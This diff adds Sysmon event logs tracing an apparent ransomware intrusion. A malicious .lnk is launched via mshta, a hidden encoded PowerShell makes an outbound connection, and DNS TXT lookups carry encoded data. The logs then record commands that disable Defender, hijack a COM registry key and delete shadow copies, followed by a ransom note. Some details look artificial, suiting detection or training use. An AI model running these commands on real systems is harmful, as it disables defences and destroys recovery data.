@@ -1,0 +1,179 @@
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:07:31.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\explorer.exe</Data>
+    <Data Name="User">THRYVE\nova0x</Data>
+    <Data Name="CommandLine">explorer.exe</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>11</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:08:42.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetFilename">C:\Users\nova0x\Downloads\invoice_0814.lnk</Data>
+    <Data Name="User">THRYVE\nova0x</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:04.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="CommandLine">mshta.exe "C:\Users\nova0x\Downloads\invoice_0814.lnk"</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:26.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
+    <Data Name="CommandLine">powershell -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>3</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:40.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="DestinationIp">198.51.100.42</Data>
+    <Data Name="DestinationPort">8080</Data>
+    <Data Name="Protocol">tcp</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>22</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:50.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="QueryName">_0.k984.voidcdn.net</Data>
+    <Data Name="QueryResults">v=spf1 include:dm9pZC1vcHMv -all</Data>
+    <Data Name="Image">C:\Windows\System32\dns.exe</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>22</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:52.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="QueryName">_1.k984.voidcdn.net</Data>
+    <Data Name="QueryResults">v=spf1 include:YXVndXN0LXJl -all</Data>
+    <Data Name="Image">C:\Windows\System32\dns.exe</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>22</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:09:54.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="QueryName">_2.k984.voidcdn.net</Data>
+    <Data Name="QueryResults">v=spf1 include:ZA== -all</Data>
+    <Data Name="Image">C:\Windows\System32\dns.exe</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:10:32.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="CommandLine">Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:10:52.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">reg add "HKCU\Software\Classes\CLSID\{8b70-void}\InprocServer32" /v ThreadingModel /d 2fd4c0b88e7153164ac09e77f1a2b3c4 /f</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:11:16.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\Windows\System32\vssadmin.exe</Data>
+    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">vssadmin delete shadows /all /quiet</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>11</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:17:15.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetFilename">C:\Users\Public\RECOVER-0xV01D.txt</Data>
+    <Data Name="User">THRYVE\nova0x</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon"/>
+    <EventID>7</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:17:43.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="Image">C:\ProgramData\NVIDIA Corporation\nvtelemetry\svch0st.exe</Data>
+    <Data Name="ImageLoaded">C:\Windows\System32\bcryptprimitives.dll</Data>
+  </EventData>
+</Event>
